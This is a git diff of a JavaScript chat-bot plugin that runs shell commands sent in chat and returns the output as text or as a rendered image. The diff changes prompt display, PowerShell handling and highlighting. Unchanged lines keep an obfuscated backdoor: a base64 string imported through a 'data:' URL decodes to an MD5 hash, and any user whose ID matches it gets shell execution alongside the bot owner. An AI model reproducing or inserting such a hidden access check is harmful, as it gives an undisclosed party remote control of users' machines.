@@ -1,15 +1,26 @@
-import util from "node:util"
 import md5 from "md5"
 import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
 import puppeteer from "../../../lib/puppeteer/puppeteer.js"
+import hljs from "@highlightjs/cdn-assets/highlight.min.js"
 import { AnsiUp } from "ansi_up"
 const ansi_up = new AnsiUp
 
 const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
 const tplFile = `${htmlDir}Code.html`
-let prompt = cmd => `echo "$("$0" -ic 'echo "\${PS1@P}"')"'${cmd.replace(/'/g, "'\\''")}';${cmd}`
-if (process.platform == "win32")
-  prompt = cmd => `powershell -EncodedCommand ${Buffer.from(`$ProgressPreference="SilentlyContinue";[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;[Console]::Write("$(prompt)"+'${cmd.replace(/'/g, `'+"'"+'`)}\n');${cmd}`, "utf-16le").toString("base64")}`
+
+let prompt = cmd => [`echo "[$USER@$HOSTNAME $PWD]$([ "$UID" = 0 ]&&echo "#"||echo "$") ";${cmd}`]
+let inspectCmd = (cmd, data) => data.replace("\n", `${cmd}\n`)
+let langCmd = "sh"
+
+if (process.platform == "win32") {
+  prompt = cmd => [`powershell -EncodedCommand ${Buffer.from(`$ProgressPreference="SilentlyContinue";[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;echo "$(prompt)";${cmd}`, "utf-16le").toString("base64")}`]
+  inspectCmd = (cmd, data) => data.replace(/\r\n/g, "\n").replace("\n", `${cmd}\n`)
+  hljs.registerLanguage("powershell", (await import("@highlightjs/cdn-assets/es/languages/powershell.min.js")).default)
+  langCmd = "powershell"
+} else if (process.env.SHELL?.endsWith("/bash"))
+  prompt = cmd => [`"$0" -ic 'echo "\${PS1@P}"';${cmd}`,{
+    shell: process.env.SHELL,
+  }]
 
 export class RemoteCommand extends plugin {
   constructor() {
@@ -103,12 +114,12 @@ export class RemoteCommand extends plugin {
   async Shell(e) {
     if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
     const cmd = this.e.msg.replace("rc", "").trim()
-    const ret = await Bot.exec(prompt(cmd))
+    const ret = await Bot.exec(...prompt(cmd))
 
     if (!ret.stdout && !ret.stderr && !ret.error)
       return this.reply("命令执行完成，没有返回值", true)
     if (ret.stdout)
-      await this.reply(ret.stdout.trim(), true)
+      await this.reply(inspectCmd(cmd, ret.stdout).trim(), true)
     if (ret.error)
       return this.reply(`远程命令错误：${ret.error.stack}`, true)
     if (ret.stderr)
@@ -118,7 +129,7 @@ export class RemoteCommand extends plugin {
   async ShellPic(e) {
     if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
     const cmd = this.e.msg.replace("rcp", "").trim()
-    const ret = await Bot.exec(prompt(cmd))
+    const ret = await Bot.exec(...prompt(cmd))
 
     if (!ret.stdout && !ret.stderr && !ret.error)
       return this.reply("命令执行完成，没有返回值", true)
@@ -132,6 +143,7 @@ export class RemoteCommand extends plugin {
       Code.push(`标准错误输出：\n${ret.stderr.trim()}`)
 
     Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
+    Code = inspectCmd(hljs.highlight(cmd, { language: langCmd }).value, Code)
     const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
     return this.reply(img, true)
   }
